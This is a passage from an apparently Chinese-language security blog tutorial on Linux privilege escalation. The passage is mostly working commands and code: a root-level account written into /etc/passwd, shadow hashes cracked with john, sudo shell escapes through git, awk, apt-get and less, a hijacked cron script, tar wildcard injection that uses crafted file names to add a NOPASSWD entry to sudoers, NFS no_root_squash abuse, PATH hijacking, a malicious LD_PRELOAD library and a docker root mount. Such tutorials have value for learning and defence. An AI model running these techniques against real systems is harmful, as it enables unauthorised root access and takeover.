文件</p><p>首先用openssl生成一个密码，passwd参数表示生成一个密码，-1表示md5,-salk表示盐(随意指定)，最后跟要加密的值</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">└─<span class="hljs-variable">$ </span>openssl passwd <span class="hljs-number">-1</span> -salt hello <span class="hljs-number">123456</span><br><span class="hljs-variable">$1</span><span class="hljs-variable">$hello</span><span class="hljs-variable">$ZwmhCpcG</span>.<span class="hljs-title class_">I1XIfVjdarKc1</span><br></code></pre></td></tr></table></figure><p>按照etc&#x2F;passwd的格式添加一个新用户，权限按root的写即可。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">test1:</span><span class="hljs-variable">$1</span><span class="hljs-variable">$hello</span><span class="hljs-variable">$ZwmhCpcG</span>.<span class="hljs-symbol">I1XIfVjdarKc1:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/usr/bin/zsh</span><br></code></pre></td></tr></table></figure><p><code>cp passwd /etc/passwd</code><br>替换&#x2F;etc&#x2F;passwd</p><p><code>su abc</code><br>输入密码abc</p><p>登录成功，则为root权限了</p><p><strong>&#x2F;etc&#x2F;shadow</strong> 文件</p><p>读 &#x2F;etc&#x2F;shadow文件, 内容中的每一行代表一个用户,可以在每行的第一个和第二个冒号之间找到用户的密码hash值。  </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>:$<span class="hljs-number">1</span>$<span class="hljs-number">1</span>$dzqAUU/vB2clNL4EHnbXq0:<span class="hljs-number">19590</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br></code></pre></td></tr></table></figure><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">加密算法<br><span class="hljs-variable">$6</span><span class="hljs-variable">$开</span>头的，表明是用<span class="hljs-title class_">SHA</span><span class="hljs-number">-512</span>加密<br><span class="hljs-variable">$1</span><span class="hljs-variable">$ </span>表明是用<span class="hljs-title class_">MD5</span>加密<br><span class="hljs-variable">$2</span><span class="hljs-variable">$ </span>是用<span class="hljs-title class_">Blowfish</span>加密<br><span class="hljs-variable">$5</span><span class="hljs-variable">$ </span>是用 <span class="hljs-title class_">SHA</span><span class="hljs-number">-256</span>加密的。<br></code></pre></td></tr></table></figure><p>我们可以将密码的hash值复制到桌面 hash文件中，用命令 </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">└─# john <span class="hljs-comment">--wordlist=/usr/share/wordlists/rockyou.txt hash</span><br><span class="hljs-built_in">Warning</span>: detected hash <span class="hljs-keyword">type</span> &quot;md5crypt&quot;, but the string <span class="hljs-keyword">is</span> <span class="hljs-keyword">also</span> recognized <span class="hljs-keyword">as</span> &quot;md5crypt-long&quot;<br>Use the &quot;--format=md5crypt-long&quot; <span class="hljs-keyword">option</span> <span class="hljs-keyword">to</span> force loading these <span class="hljs-keyword">as</span> that <span class="hljs-keyword">type</span> <span class="hljs-keyword">instead</span><br><span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">encoding</span>: UTF<span class="hljs-number">-8</span><br>Loaded <span class="hljs-number">1</span> <span class="hljs-keyword">password</span> hash (md5crypt, crypt(<span class="hljs-number">3</span>) <span class="hljs-meta">$1</span>$ (<span class="hljs-keyword">and</span> variants) [MD5 <span class="hljs-number">128</span>/<span class="hljs-number">128</span> AVX <span class="hljs-number">4</span>x3])<br>Will run <span class="hljs-number">4</span> OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> <span class="hljs-keyword">or</span> Ctrl-C <span class="hljs-keyword">to</span> <span class="hljs-keyword">abort</span>, almost <span class="hljs-keyword">any</span> other key <span class="hljs-keyword">for</span> status<br><span class="hljs-number">123</span>abc           (?) #密码    <br><span class="hljs-number">1</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> DONE (<span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-29</span> <span class="hljs-number">07</span>:<span class="hljs-number">54</span>) <span class="hljs-number">100.0</span>g/s <span class="hljs-number">38400</span>p/s <span class="hljs-number">38400</span>c/s <span class="hljs-number">38400</span>C/s alyssa..michael1<br>Use the &quot;--show&quot; <span class="hljs-keyword">option</span> <span class="hljs-keyword">to</span> display <span class="hljs-keyword">all</span> <span class="hljs-keyword">of</span> the cracked passwords reliably<br><span class="hljs-keyword">Session</span> completed.<br><br>#这里需要说明一下，john不会破解之前已经破解过的密文，可以使用命令查看之前破解的密文<br><br>方法一<br>┌──(kali㉿kali)-[~/桌面]<br>└─$ cat /home/kali/.john/john.pot<br><span class="hljs-meta">$1</span><span class="hljs-meta">$1</span>$dzqAUU/vB2clNL4EHnbXq0:<span class="hljs-number">123</span>abc<br><br>方法二<br>┌──(kali㉿kali)-[~/桌面]<br>└─$ john <span class="hljs-comment">--show hash                                     </span><br>?:<span class="hljs-number">123</span>abc<br></code></pre></td></tr></table></figure><p>补充一个关于 docker中<code>su username</code>,可能会报<code>must be run from terminal</code>;解决方案</p><p>用的比较多的解决方案：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">pytho<span class="hljs-symbol">n3</span> -c <span class="hljs-string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><h3 id="3-sudo提权"><a href="#3-sudo提权" class="headerlink" title="3.sudo提权"></a>3.sudo提权</h3><p>普通用户可以无密码提升到管理员权限</p><p>前提是&#x2F;etc&#x2F;sudoers写了这个普通用户可以无密码执行命令</p><p>文件语法：</p><p>root ALL&#x3D;(ALL) ALL</p><ul><li>root表示用户名</li><li>第一个 ALL 指示允许从任何终端、机器访问sudo</li><li>第二个 (ALL)指示sudo命令被允许以任何用户身份执行</li><li>第三个 ALL 表示所有命令都可以作为root执行</li></ul><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">backkom <span class="hljs-built_in">ALL</span>=(root) NOPASSWD: <span class="hljs-regexp">/usr/</span>bin/awk<br>backk0m <span class="hljs-built_in">ALL</span>=(root) NOPASSWD: <span class="hljs-regexp">/usr/</span>bin/apt-get<br></code></pre></td></tr></table></figure><p>允许用户 <code>backk0m</code> 在所有主机上无需密码以 <code>root</code> 身份运行 <code>/usr/bin/apt-get</code></p><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/158.png"></p><h4 id="git"><a href="#git" class="headerlink" title="git"></a>git</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#1:</span><br>sudo git <span class="hljs-built_in">help</span> config<br>!/bin/bash<br><span class="hljs-comment">#2:</span><br>sudo git -p <span class="hljs-built_in">help</span><br>!/bin/bash<br></code></pre></td></tr></table></figure><h4 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h4><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sudo awk <span class="hljs-symbol">&#x27;BEGIN</span>&#123;system(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#125;&#x27;<br></code></pre></td></tr></table></figure><p>我们输入这条命令后就会直接进入 root权限</p><h4 id="apt-get"><a href="#apt-get" class="headerlink" title="apt-get"></a>apt-get</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">sudo apt-get update -o <span class="hljs-variable constant_">APT</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Update</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Pre-Invoke</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span>=<span class="hljs-regexp">/bin/sh</span><br></code></pre></td></tr></table></figure><p>我们输入这条命令后就会直接进入 root权限</p><h4 id="less"><a href="#less" class="headerlink" title="less"></a>less</h4><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crystal">┌──(kali㉿kali)-[~<span class="hljs-regexp">/桌面]</span><br><span class="hljs-regexp">└─$ sudo less /etc</span><span class="hljs-regexp">/passwd</span><br><span class="hljs-regexp">#直接输入!/bin</span><span class="hljs-regexp">/bash</span><br><span class="hljs-regexp">┌──(root㉿kali)-[/home</span><span class="hljs-regexp">/kali/</span>桌面]<br>└─<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><p>更多提权命令请参考：  <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><h3 id="4-Cron-jobs提权"><a href="#4-Cron-jobs提权" class="headerlink" title="4.Cron jobs提权"></a>4.Cron jobs提权</h3><p>定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。cron 是 Linux 或者类 Unix 系统中最为实用的工具之一。cron 服务（守护进程）在系统后台运行，并且会持续地检查 &#x2F;etc&#x2F;crontab 文件和 &#x2F;etc&#x2F;cron.*&#x2F; 目录。它同样也会检查 &#x2F;var&#x2F;spool&#x2F;cron&#x2F; 目录</p><p>提权的前提是存在一个执行危险脚本的任务计划，并且这个任务计划执行的执行脚本可以被非root权限用户修改覆盖，并可以正常执行任务计划</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><span class="hljs-symbol">*</span> <span class="hljs-symbol">*</span> <span class="hljs-symbol">*</span> <span class="hljs-symbol">*</span> <span class="hljs-symbol">*</span> command_to_execute<br>- - - - -<br>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<br>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> +----- 星期几 (0 - 7) (Sunday=0 or 7)</span><br><span class="hljs-string"></span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> +------- 月份 (1 - 12)</span><br><span class="hljs-string"></span>|<span class="hljs-string"> </span>|<span class="hljs-string"> +--------- 日期 (1 - 31)</span><br><span class="hljs-string"></span>|<span class="hljs-string"> +----------- 小时 (0 - 23)</span><br><span class="hljs-string">+------------- 分钟 (0 - 59)</span><br><span class="hljs-string">*：（星号）代表取值范围中的每一个数字</span><br><span class="hljs-string">-：（减号）连续区间表达式，想要代表1~7，则需要写成1-7</span><br><span class="hljs-string">/：（斜杠）表示每x个。例如想在每10分钟执行一次，则在分的位置写：*/10</span><br><span class="hljs-string">,：（逗号）表示多个取值。如果想在1点，3点，5点执行一次，则在时的位置写：1,3,5</span><br></code></pre></td></tr></table></figure><h4 id="文件覆盖"><a href="#文件覆盖" class="headerlink" title="文件覆盖"></a>文件覆盖</h4><p>我们以root用户添加下面这条定时任务</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">*<span class="hljs-string">/1</span> *   * * *   root    <span class="hljs-string">/tmp/clear.py</span><br></code></pre></td></tr></table></figure><p>创建clear.py脚本，并赋可执行权限<code>chmod +x /tmp/clear.py</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#!/usr/bin/env python3</span><br>import os<br>import sys<br><br>try:<br>    os.system(<span class="hljs-string">&quot;rm -rf /tmp/test&quot;</span>)<br>except:<br>    sys.<span class="hljs-keyword">exit</span>()<br></code></pre></td></tr></table></figure><p>如果可以修改定时任务的文件(clear.py)，就可以提权，例如将上面的clear.py修改内容</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#!/usr/bin/env python3</span><br>import os<br>import sys<br><br>try:<br>    os.system(<span class="hljs-string">&quot;chmod u+s /bin/bash&quot;</span>)<br>except:<br>    sys.<span class="hljs-keyword">exit</span>()<br></code></pre></td></tr></table></figure><p>在执行<code>/bin/bash -p</code>命令即可得到root权限</p><h4 id="通配符注入"><a href="#通配符注入" class="headerlink" title="通配符注入"></a>通配符注入</h4><p>linux中有很多通配符，和正则类似，例如tar一个目录，如果写*，就代表压缩当前目录下的所有文件，*代表一个或多个字符</p><p>在操作过程中，如果有一个文件名的名字是一个参数，那么执行过程中，就会被当作参数运行，例如目录下有一个叫<code>--help</code>的文件，当cat查看该文件内容时，实际上是显示 cat的帮助信息</p><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/159.png"></p><p>我们创建定时备份脚本 crontab.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">cd</span> /var/www/html/<br>tar -zvcf /var/backups/html.tar *<br></code></pre></td></tr></table></figure><p>在<code>/ect/crontab</code>中添加</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs groovy">*<span class="hljs-regexp">/1 *   * * *   root    /</span><span class="hljs-keyword">var</span><span class="hljs-regexp">/www/</span>html/crontab.sh<br></code></pre></td></tr></table></figure><p>在tar命令中有一个checkpoint参数，即检查点，比如checkpoint&#x3D;1，则代表压缩过程中每压缩一个文件就去执行一个检查操作。</p><p>而这个检查操作的参数是–checkpoint-action&#x3D;exec&#x3D;，后面可以跟要执行的命令。</p><p>利用思路就是我们写入一个sh脚本，该脚本作用是修改sudoers文件，把当前用户添加进去，获得sudo所有权，从而进行提权。然后利用checkpoint-action&#x3D;exec&#x3D;接一个执行sh脚本的命令即可。</p><p>利用过程:首先创建两个文件，名字为参数名，然后再创建一个sh脚本，内容为向sudoers追加权限，相关命令如下:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">echo</span> &#x27;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test ALL=(root) NOPASSWD: ALL&quot;</span> &gt;&gt; <span class="hljs-string">/etc/sudoers</span>&#x27; &gt; test.sh<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; <span class="hljs-params">--checkpoint=1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; <span class="hljs-string">&quot;--checkpoint-action=exec=sh test.sh&quot;</span><br></code></pre></td></tr></table></figure><p>在 <code>/var/www/html</code>目录中执行了上述三条命令后 一分钟后就能提升到root权限</p><h3 id="5-NFS提权"><a href="#5-NFS提权" class="headerlink" title="5.NFS提权"></a>5.NFS提权</h3><p>NFS是network file system缩写，网络文件系统，用来挂载某个目录或文件进行共享，默认是2049端口，功能类似于windows的共享。</p><p>安装nfs服务端</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">sudo apt-<span class="hljs-keyword">get</span> install nfs-kernel-<span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure><p>安装后修改配置文件 <code>/etc/exports</code>,这里将home目录进行挂载共享</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">/home *(rw,no_root_squash)<br></code></pre></td></tr></table></figure><p>其中&#x2F;home是要挂载的目录,*代表允许连接的主机，这里是所有，rw是读写权限，no_root_squash代表客户端允许以root权限访问nfs。</p><p>重启相关服务</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs swift"># nfs通过rpc通信，这里把rpcbind重启<br>sudo <span class="hljs-regexp">/etc/</span><span class="hljs-keyword">init</span>.d<span class="hljs-operator">/</span>rpcbind restart<br>sudo <span class="hljs-regexp">/etc/</span><span class="hljs-keyword">init</span>.d<span class="hljs-operator">/</span>nfs<span class="hljs-operator">-</span>kernel<span class="hljs-operator">-</span>server restart<br></code></pre></td></tr></table></figure><p>此时就配置好了，可以通过showmount命令来列出目标机的共享目录，e参数显示NFS服务器的输出清单。 </p><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/160-1717158637642-3.png"></p><p>或者用nmap相关脚本进行扫描</p><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/161.png"></p><p>当nfs配置了读写权限，且允许客户端以root访问时，就会存在安全隐患。测试如下:</p><p>首先客户端把目标机nfs的共享挂载到本地，然后把bash复制进去并赋予suid权限，操作如下图。</p><p>攻击机</p><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/162.png"></p><p>此时目标机的home目录下就会有一个具有suid权限的bash。</p><h3 id="6-Path环境变量提权"><a href="#6-Path环境变量提权" class="headerlink" title="6.Path环境变量提权"></a>6.Path环境变量提权</h3><p>Linux中的PATH是一个环境变量，它指定了可执行程序所在的目录，例如bin和sbin目录，当我们在终端运行一个命令时，系统就会根据PATH来查找相关的可执行文件。</p><p>可以执行env命令列出所有的环境变量，然后找到PATH，或者grep进行结果筛选，或者echo出$PATH值，命令如下。</p><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/163.png"></p><p>首先编译以下c代码，功能为调用whoami命令</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-id">#include</span>&lt;stdio<span class="hljs-selector-class">.h</span>&gt;<br>void <span class="hljs-selector-tag">main</span>()&#123;<br><span class="hljs-built_in">setuid</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">setgid</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">system</span>(&quot;whoami&quot;);<br>&#125;<br><span class="hljs-comment">//gcc shell.c -o shell</span><br></code></pre></td></tr></table></figure><p>用root权限赋给 shell suid 权限</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">sudo chmown root <span class="hljs-keyword">shell</span><span class="language-bash"></span><br><span class="language-bash">sudo <span class="hljs-built_in">chmod</span> u+s shell</span><br></code></pre></td></tr></table></figure><p>利用:到tmp目录下，把bash写到一个whoami文件中，然后修改PATH变量添加tmp目录，再去执行shell,就会获得一个root权限。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">chmod</span> 777 <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure><p>过程: root给一个可执行文件赋予了suid，而此文件又调用了whoami命令，这时修改PATH把tmp添加到头的位置，系统再执行就会先去tmp目录下找，tmp目录下放的是恶意程序，从而导致恶意程序以root权限运行</p><p>情况:这种情况适用于，给普通用户分配了个可执行程序，且该程序有suid权限，我们又知道该程序会调用哪些命令，那么就可以结合PATH来进行提权。</p><h3 id="7-LD-PRELOAD提权"><a href="#7-LD-PRELOAD提权" class="headerlink" title="7.LD_PRELOAD提权"></a>7.LD_PRELOAD提权</h3><p>LD_PRELOAD是Linux下的一个环境变量，程序运行时都会加载一些so文件，类似于windows下程序加载dll，而LD_PRELOAD可以指定程序运行前加载的动态连接库。</p><p>测试前先按如下配置一下sudoers文件，以test用户为例，添加一个find命令和一个LD_PRELOAD。</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">test</span>ALL=(ALL:ALL) NOPASSWD:/usr/bin/find<br>Defaultenv_keep += LD_PRELOAD<br></code></pre></td></tr></table></figure><p>env_keep说明</p><p>例如aaa用户有一个aaa的环境变量，当通过su切换到bbb用户时，再查看env环境变量，aaa就没有了，也就意味着用户的切换不会带着环境变量一块切过去。而想保持某个环境不受用户切换的影响，那么可以在sudoers文件中设置env_keep.</p><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/164.png"></p><p>我们有一个find的sudo权，且env_keep中定义了LD_PRELOAD，那么我们就可以定义一个恶意的so文件，然后sudo运行find时指定LD_PRELOAD来加载我们自己的so文件，就可以实现提权。</p><p>so文件的c代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">void</span> _init()&#123;<br><span class="hljs-built_in">unsetenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br><span class="hljs-built_in">setgid</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">setuid</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后进行编译-fPIC-shared参数简单理解就是动态编辑共享库，可以进行公共调用，nostartfiles参数代表该库运行不会去调用系统的其它库，避免影响自己的程序执行。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">gcc <span class="hljs-keyword">shell.c </span>-fPIC -<span class="hljs-keyword">shared </span>-o <span class="hljs-keyword">shell.so </span>-nostartfiles<br></code></pre></td></tr></table></figure><p>编译后我们使用sudo运行find并指定LD__PRELOAD为我们编译shell.so文件，这时find就会先调用shell.so,导致我们的代码被执行，返回的权限为root</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo LD_PRELOAD=/tmp/<span class="hljs-keyword">shell</span>.<span class="hljs-keyword">so</span> <span class="hljs-keyword">find</span><br></code></pre></td></tr></table></figure><p>注意点:如果使用自己攻击机编译的so文件，传到目标机可能普通用户没有执行权限，这时需要加下权限。如果目标机支持gcc编译，也可以直接在目标机编译。</p><h3 id="8-Docker提权"><a href="#8-Docker提权" class="headerlink" title="8.Docker提权"></a>8.Docker提权</h3><p>在docker中，是允许访问root用户和docker组中的其它用户的</p><p>首先以root身份把一个普通账号添加到docker组，这里是test用户。然后使用newgrp将root账号初始组切换为docker。</p><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/165.png"></p><p>我们可以看到test已经在docker组中了</p><p>随后使用docker run来允许alpine镜像，v参数进行挂载，是将宿主机的root目录挂载到alpine的mnt下，使用冒号分隔。i参数是保持打开状态，t参数是分配一个tty终端，it一般结合使用，即保持通讯终端的打开。</p><p>这时访问docker镜像alpine，就相当于访问宿主机的root目录，权限变成了root。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -v /root:/mnt -it alpine       <br><span class="hljs-built_in">cd</span> /mnt<br>/mnt <span class="hljs-comment"># whoami</span><br>root<br></code></pre></td></tr></table></figure><h3 id="9-capability提权"><a href="#9-capability提权" class="headerlink" title="9.capability提权"></a>9.capability提权</h3><p>capability翻译为能力的意思，linux中能力的概念和suid类似，是用来让普通用户也可以做超级用户的工作，从而设置的一个机制，原来linux分的是普通用户和超级用户，后来加了能力，即赋予某某账号能力，这个账号有能力了，就可以去做事了。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-type">CAP_CHOWN</span>:修改文件属主的权限<br><span class="hljs-type">CAP_DAC_OVERRIDE</span>:忽略文件的<span class="hljs-type">DAC访问限制</span><br><span class="hljs-type">CAP_DAC_READ_SEARCH</span>:忽略文件读及目录搜索的<span class="hljs-type">DAC访问限制</span><br><span class="hljs-type">CAP_FOWNER：忽略文件属主ID必须和进程用户ID相匹配的限制</span><br><span class="hljs-type">CAP_FSETID</span>:允许设置文件的setuid位<br><span class="hljs-type">CAP_KILL</span>:允许对不属于自己的进程发送信号<br><span class="hljs-type">CAP_SETGID</span>:允许改变进程的组<span class="hljs-type">ID</span><br><span class="hljs-type">CAP_SETUID</span>:允许改变进程的用户<span class="hljs-type">ID</span><br><span class="hljs-type">CAP_SETPCAP</span>:允许向其他进程转移能力以及删除其他进程的能力<br><span class="hljs-type">CAP_LINUX_IMMUTABLE</span>:允许修改文件的<span class="hljs-type">IMMUTABLE和APPEND属性标志</span><br><span class="hljs-type">CAP_NET_BIND_SERVICE</span>:允许绑定到小于<span class="hljs-number">1024</span>的端口<br><span class="hljs-type">CAP_NET_BROADCAST</span>:允许网络广播和多播访问<br><span class="hljs-type">CAP_NET_ADMIN</span>:允许执行网络管理任务<br><span class="hljs-type">CAP_NET_RAW</span>:允许使用原始套接字<br><span class="hljs-type">CAP_IPC_LOCK</span>:允许锁定共享内存片段<br><span class="hljs-type">CAP_IPC_OWNER</span>:忽略<span class="hljs-type">IPC所有权检查</span><br><span class="hljs-type">CAP_SYS_MODULE</span>:允许插入和删除内核模块<br><span class="hljs-type">CAP_SYS_RAWIO</span>:允许直接访问<span class="hljs-regexp">/devport,/</span>dev<span class="hljs-regexp">/mem,/</span>dev<span class="hljs-operator">/</span>kmem及原始块设备<br><span class="hljs-type">CAP_SYS_CHROOT</span>:允许使用chroot()系统调用<br><span class="hljs-type">CAP_SYS_PTRACE</span>:允许跟踪任何进程<br><span class="hljs-type">CAP_SYS_PACCT</span>:允许执行进程的<span class="hljs-type">BSD式审计</span><br><span class="hljs-type">CAP_SYS_ADMIN</span>:允许执行系统管理任务，如加载或卸载文件系统<span class="hljs-operator">、</span>设置磁盘配额等<br><span class="hljs-type">CAP_SYS_BOOT</span>:允许重新启动系统<br><span class="hljs-type">CAP_SYS_NICE</span>:允许提升优先级及设置其他进程的优先级<br><span class="hljs-type">CAP_SYS_RESOURCE</span>:忽略资源限制<br><span class="hljs-type">CAP_SYS_TIME</span>:允许改变系统时钟<br><span class="hljs-type">CAP_SYS_TTY_CONFIG</span>:允许配置<span class="hljs-type">TTY设备</span><br><span class="hljs-type">CAP_MKNOD</span>:允许使用mknod()系统调用<br><span class="hljs-type">CAP_LEASE</span>:允许修改文件锁的<span 